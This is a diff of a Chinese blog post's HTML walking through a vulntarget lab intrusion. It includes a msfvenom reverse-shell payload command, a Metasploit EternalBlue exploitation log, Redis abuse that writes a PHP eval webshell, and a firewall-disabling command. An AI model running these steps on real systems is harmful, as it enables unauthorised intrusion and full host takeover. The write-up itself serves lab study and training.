@@ -306,179 +306,245 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><blockquote>
-<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/uxwbnVOxkR8OBkkY9WW6aQ">https://mp.weixin.qq.com/s/uxwbnVOxkR8OBkkY9WW6aQ</a><br><a target="_blank" rel="noopener" href="https://www.cnnews.today/showArticle?main_id=b3613271ffe35b6fd924822459c9ef36&amp;language=cht">https://www.cnnews.today/showArticle?main_id=b3613271ffe35b6fd924822459c9ef36&amp;language=cht</a></p>
+        <h3 id="references">References</h3>
+<blockquote>
+<p>https://mp.weixin.qq.com/s/uxwbnVOxkR8OBkkY9WW6aQ
+https://www.cnnews.today/showArticle?main_id=b3613271ffe35b6fd924822459c9ef36&amp;language=cht</p>
 </blockquote>
-<h3 id="拓扑图"><a href="#拓扑图" class="headerlink" title="拓扑图"></a>拓扑图</h3><p><img src="/posts/3edb83f3/1.png"></p>
+<h3 id="拓扑图">拓扑图</h3>
+<p><img src="/posts/3edb83f3/1.png"></p>
 <p>（直接在crow那个拿过来的）</p>
-<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><h4 id="域控-2019"><a href="#域控-2019" class="headerlink" title="域控 2019"></a>域控 2019</h4><p>administrator / Admin@666</p>
+<h3 id="环境搭建">环境搭建</h3>
+<h4 id="域控-2019">域控 2019</h4>
+<p>administrator / Admin@666</p>
 <p>IP 10.0.10.110</p>
-<h4 id="外网机器-win7"><a href="#外网机器-win7" class="headerlink" title="外网机器 win7"></a>外网机器 win7</h4><p>win7 / admin</p>
+<h4 id="外网机器-win7">外网机器 win7</h4>
+<p>win7 / admin</p>
 <p>IP 192.168.0.133 / 10.0.20.98</p>
-<h4 id="域内用户-2016"><a href="#域内用户-2016" class="headerlink" title="域内用户 2016"></a>域内用户 2016</h4><p>Administrator / Admin@123</p>
-<p>balsec.com\win2016 / Admin#123</p>
+<h4 id="域内用户-2016">域内用户 2016</h4>
+<p>Administrator / Admin@123</p>
+<p>balsec.com / Admin#123</p>
 <p>IP 10.0.10.111 / 10.0.20.99</p>
-<br>
-
-<h3 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h3><p>外网机器是一台win7 已知IP为 10.10.10.248</p>
-<h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><p>先用nmap扫一下 发现就一个80 web端口</p>
-<p><img src="/posts/3edb83f3/2.png" alt="截图"></p>
-<h4 id="通达OA-Getshell"><a href="#通达OA-Getshell" class="headerlink" title="通达OA Getshell"></a>通达OA Getshell</h4><p>10.10.10.248 主页是一台通达OA 直接使用工具梭哈</p>
-<p><img src="/posts/3edb83f3/3.png" alt="截图"></p>
+<p><br></p>
+<h3 id="外网打点">外网打点</h3>
+<p>外网机器是一台win7 已知IP为 10.10.10.248</p>
+<h4 id="端口扫描">端口扫描</h4>
+<p>先用nmap扫一下 发现就一个80 web端口</p>
+<figure>
+<img src="/posts/3edb83f3/2.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
+<h4 id="通达oa-getshell">通达OA Getshell</h4>
+<p>10.10.10.248 主页是一台通达OA 直接使用工具梭哈</p>
+<figure>
+<img src="/posts/3edb83f3/3.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
 <p>连接蚁剑</p>
 <p>执行<code>whoami</code> 直接是system权限</p>
-<p><img src="/posts/3edb83f3/4.png" alt="截图"></p>
+<figure>
+<img src="/posts/3edb83f3/4.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
 <p>然后 <code>systeminfo</code> <code>ipconfig /all</code></p>
 <p>发现有两张网卡 不在域内</p>
-<p><img src="/posts/3edb83f3/5.png" alt="截图"></p>
-<br>
-
+<figure>
+<img src="/posts/3edb83f3/5.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
+<p><br></p>
 <p>这里直接上CS</p>
 <p>本想直接从cs 转到msf，一直连不上换payload也不行，就直接上个msf马</p>
 <p><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.10.114 lport=8888 -f exe &gt; shell.exe</code></p>
-<br>
-
-<h4 id="ms17-010利用"><a href="#ms17-010利用" class="headerlink" title="ms17-010利用"></a>ms17-010利用</h4><p>这里的win7也存在ms17010漏洞 成功拿到</p>
+<p><br></p>
+<h4 id="ms17-010利用">ms17-010利用</h4>
+<p>这里的win7也存在ms17010漏洞 成功拿到</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">msf6 auxiliary(server/socks_proxy) &gt; use auxiliary/scanner/smb/smb_ms17_010 </span><br><span class="line">sf6 auxiliary(scanner/smb/smb_ms17_010) &gt; set rhosts 10.10.10.248</span><br><span class="line">rhosts =&gt; 10.10.10.248</span><br><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; exploit </span><br><span class="line"></span><br><span class="line">[+] 10.10.10.248:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)</span><br><span class="line">[*] 10.10.10.248:445      - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; use exploit/windows/smb/ms17_010_eternalblue </span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set rhosts 10.10.10.248</span><br><span class="line">rhosts =&gt; 10.10.10.248</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.10.114:4444 </span><br><span class="line">[*] 10.10.10.248:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check</span><br><span class="line">[+] 10.10.10.248:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)</span><br><span class="line">[*] 10.10.10.248:445      - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[+] 10.10.10.248:445 - The target is vulnerable.</span><br><span class="line">[*] 10.10.10.248:445 - Connecting to target for exploitation.</span><br><span class="line">[+] 10.10.10.248:445 - Connection established for exploitation.</span><br><span class="line">[+] 10.10.10.248:445 - Target OS selected valid for OS indicated by SMB reply</span><br><span class="line">[*] 10.10.10.248:445 - CORE raw buffer dump (42 bytes)</span><br><span class="line">[*] 10.10.10.248:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes</span><br><span class="line">[*] 10.10.10.248:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv</span><br><span class="line">[*] 10.10.10.248:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      </span><br><span class="line">[+] 10.10.10.248:445 - Target arch selected valid for arch indicated by DCE/RPC reply</span><br><span class="line">[*] 10.10.10.248:445 - Trying exploit with 12 Groom Allocations.</span><br><span class="line">[*] 10.10.10.248:445 - Sending all but last fragment of exploit packet</span><br><span class="line">[*] 10.10.10.248:445 - Starting non-paged pool grooming</span><br><span class="line">[+] 10.10.10.248:445 - Sending SMBv2 buffers</span><br><span class="line">[+] 10.10.10.248:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.</span><br><span class="line">[*] 10.10.10.248:445 - Sending final SMBv2 buffers.</span><br><span class="line">[*] 10.10.10.248:445 - Sending last fragment of exploit packet!</span><br><span class="line">[*] 10.10.10.248:445 - Receiving response from exploit packet</span><br><span class="line">[+] 10.10.10.248:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!</span><br><span class="line">[*] 10.10.10.248:445 - Sending egg to corrupted connection.</span><br><span class="line">[*] 10.10.10.248:445 - Triggering free of corrupted buffer.</span><br><span class="line">[*] Sending stage (200262 bytes) to 10.10.10.248</span><br><span class="line">[*] Meterpreter session 2 opened (10.10.10.114:4444 -&gt; 10.10.10.248:50270) at 2022-03-22 02:50:35 -0400</span><br><span class="line">[+] 10.10.10.248:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[+] 10.10.10.248:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[+] 10.10.10.248:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br><span class="line">meterpreter &gt; sysinfo</span><br><span class="line">Computer        : WIN7-PC</span><br><span class="line">OS              : Windows 7 (6.1 Build 7601, Service Pack 1).</span><br><span class="line">Architecture    : x64</span><br><span class="line">System Language : zh_CN</span><br><span class="line">Domain          : WORKGROUP</span><br><span class="line">Logged On Users : 2</span><br><span class="line">Meterpreter     : x64/windows</span><br><span class="line">meterpreter &gt; </span><br><span class="line"></span><br><span class="line">meterpreter &gt; ipconfig</span><br><span class="line"></span><br><span class="line">Interface  1</span><br><span class="line">============</span><br><span class="line">Name         : Software Loopback Interface 1</span><br><span class="line">Hardware MAC : 00:00:00:00:00:00</span><br><span class="line">MTU          : 4294967295</span><br><span class="line">IPv4 Address : 127.0.0.1</span><br><span class="line">IPv4 Netmask : 255.0.0.0</span><br><span class="line">IPv6 Address : ::1</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface 11</span><br><span class="line">============</span><br><span class="line">Name         : Intel(R) PRO/1000 MT Network Connection</span><br><span class="line">Hardware MAC : 00:0c:29:f6:6a:05</span><br><span class="line">MTU          : 1500</span><br><span class="line">IPv4 Address : 10.10.10.248</span><br><span class="line">IPv4 Netmask : 255.255.255.0</span><br><span class="line">IPv6 Address : fe80::2de1:362a:d91a:ed60</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff::</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface 13</span><br><span class="line">============</span><br><span class="line">Name         : Intel(R) PRO/1000 MT Network Connection #2</span><br><span class="line">Hardware MAC : 00:0c:29:f6:6a:0f</span><br><span class="line">MTU          : 1500</span><br><span class="line">IPv4 Address : 10.0.20.98</span><br><span class="line">IPv4 Netmask : 255.255.255.0</span><br><span class="line">IPv6 Address : fe80::5146:76d1:7288:d8be</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff::</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface 17</span><br><span class="line">============</span><br><span class="line">Name         : Microsoft ISATAP Adapter #3</span><br><span class="line">Hardware MAC : 00:00:00:00:00:00</span><br><span class="line">MTU          : 1280</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface 25</span><br><span class="line">============</span><br><span class="line">Name         : Microsoft ISATAP Adapter #4</span><br><span class="line">Hardware MAC : 00:00:00:00:00:00</span><br><span class="line">MTU          : 1280</span><br><span class="line">IPv6 Address : fe80::5efe:a0a:af8</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff</span><br><span class="line"></span><br><span class="line">meterpreter &gt; arp</span><br><span class="line"></span><br><span class="line">ARP cache</span><br><span class="line">=========</span><br><span class="line"></span><br><span class="line">    IP address       MAC address        Interface</span><br><span class="line">    ----------       -----------        ---------</span><br><span class="line">    10.0.20.255      ff:ff:ff:ff:ff:ff  13</span><br><span class="line">    10.10.10.1       fc:7c:02:73:a5:40  11</span><br><span class="line">    10.10.10.114     34:e1:2d:a3:ac:4b  11</span><br><span class="line">    10.10.10.255     ff:ff:ff:ff:ff:ff  11</span><br><span class="line">    224.0.0.2        00:00:00:00:00:00  1</span><br><span class="line">    224.0.0.2        01:00:5e:00:00:02  11</span><br><span class="line">    224.0.0.2        01:00:5e:00:00:02  13</span><br><span class="line">    224.0.0.22       00:00:00:00:00:00  1</span><br><span class="line">    224.0.0.22       01:00:5e:00:00:16  11</span><br><span class="line">    224.0.0.22       01:00:5e:00:00:16  13</span><br><span class="line">    224.0.0.252      00:00:00:00:00:00  1</span><br><span class="line">    224.0.0.252      01:00:5e:00:00:fc  11</span><br><span class="line">    224.0.0.252      01:00:5e:00:00:fc  13</span><br><span class="line">    239.255.255.250  00:00:00:00:00:00  1</span><br><span class="line">    239.255.255.250  01:00:5e:7f:ff:fa  11</span><br><span class="line">    255.255.255.255  ff:ff:ff:ff:ff:ff  11</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
 <p>看到存在两个网卡 另一个网段为 <code>10.0.20.0/24</code></p>
 <p>然后去迁移进程 添加路由</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/manage/migrate </span><br><span class="line"></span><br><span class="line">[!] SESSION may not be compatible with this module (missing Meterpreter features: stdapi_sys_process_set_term_size)</span><br><span class="line">[*] Running module against WIN7-PC</span><br><span class="line">[*] Current server process: spoolsv.exe (1140)</span><br><span class="line">[*] Spawning notepad.exe process to migrate into</span><br><span class="line">[*] Spoofing PPID 0</span><br><span class="line">[*] Migrating into 3200</span><br><span class="line">[+] Successfully migrated into process 3200</span><br><span class="line">meterpreter &gt; run post/multi/manage/autoroute </span><br><span class="line"></span><br><span class="line">[!] SESSION may not be compatible with this module (incompatible session platform: windows)</span><br><span class="line">[*] Running module against WIN7-PC</span><br><span class="line">[*] Searching for subnets to autoroute.</span><br><span class="line">[+] Route added to subnet 10.0.20.0/255.255.255.0 from host&#x27;s routing table.</span><br><span class="line">[+] Route added to subnet 10.10.10.0/255.255.255.0 from host&#x27;s routing table.</span><br><span class="line">meterpreter &gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
 <p><code>route print</code> 查看路由</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">msf6 post(multi/manage/autoroute) &gt; route print</span><br><span class="line"></span><br><span class="line">IPv4 Active Routing Table</span><br><span class="line">=========================</span><br><span class="line"></span><br><span class="line">   Subnet             Netmask            Gateway</span><br><span class="line">   ------             -------            -------</span><br><span class="line">   10.0.20.0          255.255.255.0      Session 2</span><br><span class="line">   10.10.10.0         255.255.255.0      Session 2</span><br><span class="line"></span><br><span class="line">[*] There are currently no IPv6 routes defined.</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
 <p>然后使用msf 端口扫描模块</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; use auxiliary/scanner/portscan/tcp</span><br><span class="line">msf6 auxiliary(scanner/portscan/tcp) &gt; set ports 22,23,80,443,8000,8080,8081,3389,143,445,6379,7001,7002,1433</span><br><span class="line">ports =&gt; 22,23,80,443,8000,8080,8081,3389,143,445,6379,7001,7002,1433</span><br><span class="line">msf6 auxiliary(scanner/portscan/tcp) &gt; set rhosts 10.0.20.0/24</span><br><span class="line">rhosts =&gt; 10.0.20.0/24</span><br><span class="line">msf6 auxiliary(scanner/portscan/tcp) &gt; set threads 20</span><br><span class="line">threads =&gt; 20</span><br><span class="line">msf6 auxiliary(scanner/portscan/tcp) &gt; exploit </span><br><span class="line"></span><br><span class="line">[+] 10.0.20.1:            - 10.0.20.1:445 - TCP OPEN</span><br><span class="line">[+] 10.0.20.1:            - 10.0.20.1:3389 - TCP OPEN</span><br><span class="line"></span><br><span class="line">[*] 10.0.20.0/24:         - Scanned  26 of 256 hosts (10% complete)</span><br><span class="line">[*] 10.0.20.0/24:         - Scanned  56 of 256 hosts (21% complete)</span><br><span class="line">[*] 10.0.20.0/24:         - Scanned  79 of 256 hosts (30% complete)</span><br><span class="line">[+] 10.0.20.98:           - 10.0.20.98:80 - TCP OPEN</span><br><span class="line">[+] 10.0.20.98:           - 10.0.20.98:445 - TCP OPEN</span><br><span class="line">[+] 10.0.20.99:           - 10.0.20.99:80 - TCP OPEN</span><br><span class="line">[+] 10.0.20.99:           - 10.0.20.99:6379 - TCP OPEN</span><br><span class="line">[*] 10.0.20.0/24:         - Scanned 103 of 256 hosts (40% complete)</span><br><span class="line">[*] 10.0.20.0/24:         - Scanned 129 of 256 hosts (50% complete)</span><br><span class="line">[*] 10.0.20.0/24:         - Scanned 158 of 256 hosts (61% complete)</span><br><span class="line">[*] 10.0.20.0/24:         - Scanned 180 of 256 hosts (70% complete)</span><br><span class="line">[*] 10.0.20.0/24:         - Scanned 207 of 256 hosts (80% complete)</span><br><span class="line">[*] 10.0.20.0/24:         - Scanned 233 of 256 hosts (91% complete)</span><br><span class="line">[*] 10.0.20.0/24:         - Scanned 256 of 256 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>扫到两台机器  98是拿到的外网win7  99是这个网段的另一台机器</p>
-<br>
-
-<p>这里设置个代理(之前我都是手动去配路由 没用过这个在msf session中自动配的  然后就手动去配的 结果都是启动就结束 然后我自己再去proxychain 连127.0.0.1:1080发现自动路由那里已经给配置好了…) </p>
-<br>
-
-<h3 id="横向第二台机器"><a href="#横向第二台机器" class="headerlink" title="横向第二台机器"></a>横向第二台机器</h3><p>99这台机器开放了80端口和6379端口 可测试下是否存在redis未授权</p>
-<p>先用dirb 去扫一下80端口的目录 dirb太慢了 没打扫到啥换dirsearch </p>
+<p>扫到两台机器 98是拿到的外网win7 99是这个网段的另一台机器</p>
+<p><br></p>
+<p>这里设置个代理(之前我都是手动去配路由 没用过这个在msf
+session中自动配的 然后就手动去配的 结果都是启动就结束
+然后我自己再去proxychain
+连127.0.0.1:1080发现自动路由那里已经给配置好了...)</p>
+<p><br></p>
+<h3 id="横向第二台机器">横向第二台机器</h3>
+<p>99这台机器开放了80端口和6379端口 可测试下是否存在redis未授权</p>
+<p>先用dirb 去扫一下80端口的目录 dirb太慢了 没打扫到啥换dirsearch</p>
 <p><code>proxychain python3 dirsearch.py -u http://10.0.20.99</code></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">403   225B   http://10.0.20.99:80/Trace.axd::$DATA</span><br><span class="line">200    11B   http://10.0.20.99:80/index.php</span><br><span class="line">200    11B   http://10.0.20.99:80/index.pHp</span><br><span class="line">200    11B   http://10.0.20.99:80/index.php.</span><br><span class="line">200    11B   http://10.0.20.99:80/index.php/login/</span><br><span class="line">403   225B   http://10.0.20.99:80/index.php::$DATA</span><br><span class="line">200    14KB  http://10.0.20.99:80/l.php</span><br><span class="line">200    70KB  http://10.0.20.99:80/phpinfo.php</span><br><span class="line">403   226B   http://10.0.20.99:80/web.config::$DATA</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
 <p>只有l.php 和 phpinfo有点信息 l.php是一个探针</p>
-<p><img src="/posts/3edb83f3/6.png" alt="截图"></p>
-<p><img src="/posts/3edb83f3/7.png" alt="截图"></p>
-<p>通过探针可用发现是使用phpstudy搭建的，绝对路径为<code> C:/phpStudy/PHPTutorial/WWW</code> </p>
-<h5 id="CS建立socks4代理"><a href="#CS建立socks4代理" class="headerlink" title="CS建立socks4代理"></a>CS建立socks4代理</h5><p>这里也可以使用cs的代理去访问web服务</p>
-<p>右键拿到权限的主机 —&gt; Pivoting —&gt; Socks Server</p>
+<figure>
+<img src="/posts/3edb83f3/6.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
+<figure>
+<img src="/posts/3edb83f3/7.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
+<p>通过探针可用发现是使用phpstudy搭建的，绝对路径为<code>C:/phpStudy/PHPTutorial/WWW</code></p>
+<h5 id="cs建立socks4代理">CS建立socks4代理</h5>
+<p>这里也可以使用cs的代理去访问web服务</p>
+<p>右键拿到权限的主机 ---&gt; Pivoting ---&gt; Socks Server</p>
 <p>然后会生成一个随机未占用的端口，点击启动即可</p>
-<p><img src="/posts/3edb83f3/8.png" alt="截图"></p>
+<figure>
+<img src="/posts/3edb83f3/8.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
 <p>然后使用代理 连接 socks4 CSip 和这个端口即可</p>
 <p>（也可以使用前面msf起的代理）</p>
-<br>
-
-<h4 id="Redis未授权getshell"><a href="#Redis未授权getshell" class="headerlink" title="Redis未授权getshell"></a>Redis未授权getshell</h4><p>没啥利用点，那就去考虑 6379的redis了</p>
+<p><br></p>
+<h4 id="redis未授权getshell">Redis未授权getshell</h4>
+<p>没啥利用点，那就去考虑 6379的redis了</p>
 <p><code>proxychains redis-cli -h 10.0.20.99</code> 发现未授权</p>
 <p>可直接写一个webshell 然后去连接</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">10.0.20.99:6379&gt; config set dir &quot;C:/phpStudy/PHPTutorial/WWW&quot;</span><br><span class="line">OK</span><br><span class="line">10.0.20.99:6379&gt; config set dbfilename shell.php</span><br><span class="line">OK</span><br><span class="line">10.0.20.99:6379&gt; set webshell &quot;&lt;?php @eval($_REQUEST[&#x27;ant&#x27;]);?&gt;&quot;</span><br><span class="line">OK</span><br><span class="line">10.0.20.99:6379&gt; save</span><br><span class="line">OK</span><br><span class="line">10.0.20.99:6379&gt; </span><br></pre></td></tr></table></figure>
-
-<p>能写入但是没法连上蚁剑… … </p>
+<p>能写入但是没法连上蚁剑... ...</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">10.0.20.99:6379&gt; config set dir &quot;C:/phpStudy/PHPTutorial/WWW&quot;</span><br><span class="line">OK</span><br><span class="line">10.0.20.99:6379&gt; config set dbfilename info.php</span><br><span class="line">OK</span><br><span class="line">10.0.20.99:6379&gt; set webshell &quot;&lt;?php phpinfo();?&gt;&quot;</span><br><span class="line">OK</span><br><span class="line">10.0.20.99:6379&gt; save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure>
-
 <p>写一个phpinfo也没啥问题 那基本可以确定是蚁剑代理的问题了</p>
-<p><img src="/posts/3edb83f3/9.png" alt="截图"></p>
-<br>
-
-<p>使用蚁剑自身代理没连上，使用socksCap也没连上，使用proxifier就成功连上了….</p>
-<p><img src="/posts/3edb83f3/10.png" alt="截图"></p>
-<br>
-
-<p><code>whomai </code> 得到也是system权限</p>
-<p><code>systeminfo</code>  得到域信息和两张网卡</p>
-<p><img src="/posts/3edb83f3/11.png" alt="截图"></p>
-<p>域名为 <code>vulntarget.com</code>  一张网卡为 <code>10.0.20.0/24</code> 属于dmz区的网段</p>
+<figure>
+<img src="/posts/3edb83f3/9.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
+<p><br></p>
+<p>使用蚁剑自身代理没连上，使用socksCap也没连上，使用proxifier就成功连上了....</p>
+<figure>
+<img src="/posts/3edb83f3/10.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
+<p><br></p>
+<p><code>whomai</code> 得到也是system权限</p>
+<p><code>systeminfo</code> 得到域信息和两张网卡</p>
+<figure>
+<img src="/posts/3edb83f3/11.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
+<p>域名为 <code>vulntarget.com</code> 一张网卡为
+<code>10.0.20.0/24</code> 属于dmz区的网段</p>
 <p>然后<code>10.0.10.0/24</code> 基本上可以判定为是域网段</p>
 <p>然后查一下杀软 <code>tasklist -svc</code></p>
-<p><img src="/posts/3edb83f3/12.png" alt="截图"></p>
+<figure>
+<img src="/posts/3edb83f3/12.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
 <p>存在WinDef</p>
 <p>生成一个马 再还没被杀的时候 也连不上，估计是开了防火墙</p>
 <p><code>netsh advfirewall show allprofiles</code> 查看防火墙状态</p>
-<p><img src="/posts/3edb83f3/13.png" alt="截图"></p>
+<figure>
+<img src="/posts/3edb83f3/13.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
 <p>一顿乱码，先去改一下编码方式 改成gbk后就可以了</p>
-<p><img src="/posts/3edb83f3/14.png" alt="截图"></p>
-<br>
-
-<p><code>netsh advfirewall set allprofiles state off</code> 关闭防火墙(这里是system权限 直接就可关闭)</p>
-<p><img src="/posts/3edb83f3/15.png" alt="截图"></p>
-<br>
-
